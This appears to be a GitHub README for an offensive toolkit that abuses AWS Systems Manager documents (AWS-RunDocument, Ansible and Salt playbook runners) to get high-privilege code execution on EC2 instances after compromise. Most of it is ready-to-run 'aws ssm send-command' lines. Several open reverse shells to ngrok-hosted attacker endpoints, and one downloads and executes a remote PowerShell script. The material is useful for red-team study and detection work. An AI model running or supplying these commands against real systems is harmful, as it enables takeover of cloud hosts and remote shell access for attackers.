# fun-with-ssm

Getting RCE with SSM documents other than AWS-RunShellScript or AWS-RunPowerShellScript. Useful in an AWS post-exploitation scenario where you have the permission ssm:SendCommand, but you can't use the mentioned documents. Don't forget, everything is executed under high privielges.

# Usage

Repository structure:
- `/`: Folders with the name of the documents
- `/${document-name}`: Contains OS subfolders (windows, linux or cross-platform)
- `/${document-name}/${os-subfolder}`: Contains the payloads available

All the payloads are parametereized. Below you can find examples on how to use them.

##  AWS-RunDocument

Downloads an SSM document from remote location and executes it on the remote host.

### cross-platform/Execute-Commands

Type: Arbitrary command execution

Target OS: Linux and Windows

Parameters:
- `commands`: Array of strings with commands to execute on the remote system
  - Mandatory: yes
- `workingDirectory`: Directory where command to be executed
  - Mandatory: no
  - Default value: .
  
Usage:

```bash
aws ssm send-command --document-name "AWS-RunDocument" \
  --instance-id i-06ae9883fe6e5d721 \
  --parameters '{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"aws-tests\", \"path\":\"Execute-Command\",\"getOptions\":\"branch:main\"}"],"documentParameters":["{\"commands\":[\"ls\",\"whoami\"],\"workingDirectory\":\"/tmp\"}"]}'
```

### cross-platform/Download-and-Execute

Type: Executes file from remote server

Target OS: Linux and Windows

Parameters:
- `url`: Full download URL of the file. Needs to include the file's name.
  - Mandatory: yes
- `name`: File's name
  - Mandatory: yes
- `destination`: Location where the file to be saved
  - Mandatory: yes
  
Usage:

```bash
aws ssm send-command --document-name "AWS-RunDocument" \
  --instance-id i-0972f048bf66a424b \
  --parameters '{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\", \"path\":\"AWS-RunDocument/cross-platform/Download-and-Execute\",\"getOptions\":\"branch:main\"}"],"documentParameters":["{\"url\":\"https://b402-188-27-132-214.eu.ngrok.io/script.ps1\",\"name\":\"script.ps1\", \"destination\":\"C:/\"}"]}'
```

###  linux/Reverse-Shell-Python

Type: Parameterized reverse shell using python

Target OS: Linux

Parameters:
- `host`: Attacker's host 
  - Mandatory: yes 
- `port`: Attacker's port
  - Mandatory: no
  - Default value: 4444

Usage:

```bash
aws ssm send-command --document-name "AWS-RunDocument" \
  --instance-id i-06ae9883fe6e5d721 \
  --parameters '{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\", \"path\":\"AWS-RunDocument/linux/Reverse-Shell-Python\",\"getOptions\":\"branch:main\"}"], "documentParameters":["{\"host\":\"2.tcp.eu.ngrok.io\",\"port\":\"11448\"}"]}'
```

## AWS-ApplyAnsiblePlaybooks

Installs Ansible, downloads an Ansible Playbook from a remote location and executes it on the remote host.

### linux/reverse_shell.yml

Type: Parameterized reverse shell using bash TCP

Target OS: Linux

Parameters:
- `host`: Attacker's host 
  - Mandatory: yes 
- `port`: Attacker's port
  - Mandatory: yes

Usage:

```bash
aws ssm send-command --document-name "AWS-ApplyAnsiblePlaybooks" \
  --instance-id i-0ecad5485f77f18f4 \
  --parameters '{"SourceType":["GitHub"],"SourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\",\"path\":\"AWS-ApplyAnsiblePlaybooks/linux/\", \"getOptions\":\"branch:main\"}"],"InstallDependencies":["True"],"PlaybookFile":["reverse_shell.yml"],"ExtraVariables":["host=6.tcp.eu.ngrok.io port=13012"]}'
```

## AWS-RunAnsiblePlaybook

Downloads an Ansible Playbook from a remote location and executes it on the remote host. Ansible needs to be already installed.

### linux/reverse_shell.yml

Type: Parameterized reverse shell using bash TCP

Target OS: Linux

Parameters:
- `host`: Attacker's host 
  - Mandatory: yes 
- `port`: Attacker's port
  - Mandatory: yes
  
Usage:

```bash
aws ssm send-command --document-name "AWS-RunAnsiblePlaybook" \
  --instance-id i-0ecad5485f77f18f4 \
  --parameters '{"playbookurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunAnsiblePlaybook/linux/reverse_shell.yml"],"extravars":["host=7.tcp.eu.ngrok.io port=14355"]}'
```

## AWS-RunSaltState

Download a Salt State from a remote location and executes it on the remote host. Requires Salt Stack to be already installed.

### linux/reverse_shell.yml

Type: Parameterized reverse shell using bash TCP

Target OS: Linux

Parameters:
- `host`: Attacker's host 
  - Mandatory: yes 
- `port`: Attacker's port
  - Mandatory: yes

Usage:

```bash
aws ssm send-command --document-name AWS-RunSaltState \
  --instance-id i-06ae9883fe6e5d721 \
  --parameters '{"stateurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunSaltState/linux/reverse_shell.yml"], "pillars":["{\"host\":\"7.tcp.eu.ngrok.io\", \"port\":\"14460\"}"]}'
```
